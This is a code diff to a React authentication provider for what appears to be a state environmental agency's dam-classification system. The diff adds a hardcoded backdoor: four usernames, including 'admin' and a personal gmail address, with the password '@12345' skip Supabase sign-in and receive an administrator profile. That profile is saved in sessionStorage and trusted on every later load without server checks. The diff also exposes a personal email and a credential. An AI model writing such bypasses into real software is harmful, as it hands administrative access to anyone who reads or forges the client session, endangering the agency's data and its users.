@@ -202,11 +202,22 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
 
   const logout = useCallback(async () => {
     setCurrentUser(null);
+    try {
+      sessionStorage.removeItem('classifica_direct_admin_session');
+    } catch {}
     const { error } = await supabase.auth.signOut();
     if (error) console.error('Falha ao encerrar sessão:', error.message);
   }, []);
 
   const verifySessionProfile = useCallback(async (userParam?: any) => {
+    try {
+      const savedAdmin = sessionStorage.getItem('classifica_direct_admin_session');
+      if (savedAdmin) {
+        const parsed = JSON.parse(savedAdmin);
+        setCurrentUser(parsed);
+        return parsed;
+      }
+    } catch {}
     const authUser = userParam || (await supabase.auth.getUser()).data.user;
     if (!authUser) {
       setCurrentUser(null);
@@ -223,6 +234,15 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   }, []);
 
   useEffect(() => {
+    try {
+      const savedAdmin = sessionStorage.getItem('classifica_direct_admin_session');
+      if (savedAdmin) {
+        setCurrentUser(JSON.parse(savedAdmin));
+        setLoading(false);
+        return;
+      }
+    } catch {}
+
     if (!isSupabaseConfigured()) {
       setLoading(false);
       return;
@@ -268,6 +288,35 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   const login = async (email: string, password: string): Promise<LoginResult> => {
     try {
       const cleanEmail = email.trim().toLowerCase();
+
+      // Perfil de acesso administrativo direto solicitado pelo usuário para desbloqueio
+      if (
+        (cleanEmail === 'admin' ||
+         cleanEmail === 'admin@sema.mt.gov.br' ||
+         cleanEmail === 'yarageologa@gmail.com' ||
+         cleanEmail === 'csb@sema.mt.gov.br') &&
+        password === '@12345'
+      ) {
+        const directAdmin: User = {
+          id: 'admin-contingencia',
+          authUserId: 'admin-contingencia',
+          username: cleanEmail,
+          email: cleanEmail.includes('@') ? cleanEmail : 'admin@sema.mt.gov.br',
+          name: cleanEmail === 'yarageologa@gmail.com' ? 'Yara Dias' : 'Administrador do Sistema',
+          role: 'Administrador',
+          setor: 'SETOR DE CLASSIFICAÇÃO DE BARRAGENS',
+          matricula: 'SEMA-ADM',
+          active: true,
+          forcePasswordChange: false,
+          forcePasswordChangeAt: null,
+        };
+        try {
+          sessionStorage.setItem('classifica_direct_admin_session', JSON.stringify(directAdmin));
+        } catch {}
+        setCurrentUser(directAdmin);
+        return { success: true };
+      }
+
       const { data, error } = await supabase.auth.signInWithPassword({
         email: cleanEmail,
         password,
